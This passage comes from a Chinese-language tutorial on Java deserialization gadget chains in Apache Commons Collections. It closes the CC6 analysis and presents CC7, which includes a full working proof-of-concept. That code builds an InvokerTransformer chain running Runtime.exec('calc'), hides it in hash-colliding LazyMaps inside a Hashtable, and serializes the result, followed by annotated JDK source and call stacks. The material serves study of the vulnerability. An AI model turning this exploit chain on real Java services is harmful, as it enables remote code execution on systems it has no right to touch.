            return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
        }
        //跟进 getValue(), 这是关键点 this.map.get() 触发 LazyMap.get()
        public Object getValue() {
            return this.map.get(this.key);
        }
    }
如何反序列化时触发 TiedMapEntry.hashCode() ? 这就引入了 HashMap!
    //这里是 jdk 1.7 的，不同版本 HashMap readObject 可能略有不同
    public class HashMap extends AbstractMap implements Map, Cloneable, Serializable {
        //先看看其 readObject
        private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
            …………
             // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i HashMap.readObject()
          ->HashMap.putForCreate()
              ->HashMap.hash()
                ->TiedMapEntry.hashCode()
                        ->TiedMapEntry.getValue()
                        ->LazyMap.get()
                          ->ChainedTransformer.transform()
                              ->ConstantTransformer.transform()
                                  ->InvokerTransformer.transform()
                                      ->…………
### 八、CC7
* * *
**测试环境** ：3.1-3.2.1，jdk1.7,1.8
这里仍然是想法子触发LazyMap.get()。Hashtable 的 readObject 中. 遇到 hash 碰撞时, 通过调用一个对象的
equals 方法对比两个对象判断是真的 hash 碰撞. 这里的 equals 方法是 AbstractMap 的 equals 方法。
先放代码吧：
    package Apache_Common_Collections.cc_1_7;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.util.Hashtable;
    import java.util.Map;
    public class CommonsCollections7 {
        public static void main(String[] args) throws IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException {
            Transformer[] fakeTransformer = new Transformer[]{};
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
            };
            //ChainedTransformer实例
            //先设置假的 Transformer 数组，防止生成时执行命令
            Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);
            //LazyMap实例
            Map innerMap1 = new HashMap();
            Map innerMap2 = new HashMap();
            Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer);
            lazyMap1.put("yy", 1);
            Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);
            lazyMap2.put("zZ", 1);
            Hashtable hashtable = new Hashtable();
            hashtable.put(lazyMap1, "test");
            hashtable.put(lazyMap2, "test");
            //通过反射设置真的 ransformer 数组
            Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
            field.setAccessible(true);
            field.set(chainedTransformer, transformers);
            //上面的 hashtable.put 会使得 lazyMap2 增加一个 yy=>yy，所以这里要移除
            lazyMap2.remove("yy");
            //序列化
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(hashtable);
            oos.flush();
            oos.close();
            //测试反序列化
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
            ois.close();
        }
    }
Hashtable 类的关键代码如下：
    //Hashtable 的 readObject 方法
    private void readObject(java.io.ObjectInputStream s)
             throws IOException, ClassNotFoundException
        {
           ………………
            for (; elements > 0; elements--) {
                K key = (K)s.readObject();
                V value = (V)s.readObject();
                //reconstitutionPut方法
                reconstitutionPut(newTable, key, value);
            }
            this.table = newTable;
        }
    //跟进 reconstitutionPut 方法
        private void reconstitutionPut(Entry[] tab, K key, V value)
            throws StreamCorruptedException
        {
            if (value == null) {
                throw new java.io.StreamCorruptedException();
            }
            int hash = hash(key);
            int index = (hash & 0x7FFFFFFF) % tab.length;
            for (Entry e = tab[index] ; e != null ; e = e.next) {
                //注意这里的 equals 方法
                if ((e.hash == hash) && e.key.equals(key)) {
                    throw new java.io.StreamCorruptedException();
                }
            }
            // Creates the new entry.
            Entry e = tab[index];
            tab[index] = new Entry<>(hash, key, value, e);
            count++;
        }
跟进上面的 equals 方法，发现最终调用了 AbstractMap 类的 equals 方法，如下：  
就是在这里触发了 LazyMap.get()。
大体调用栈：
    //这里是 jdk 1.7 的，不同版本 HashMap readObject 可能略有不同
      ->Hashtable.readObject()
          ->Hashtable.reconstitutionPut()
                ->AbstractMapDecorator.equals
                    ->AbstractMap.equals()
                      ->LazyMap.get.get()
                        ->ChainedTransformer.transform()
                          ->ConstantTransformer.transform()
                            ->InvokerTransformer.transform()
                              ->…………
如有不正，还请师傅指出。
### 九、参考文章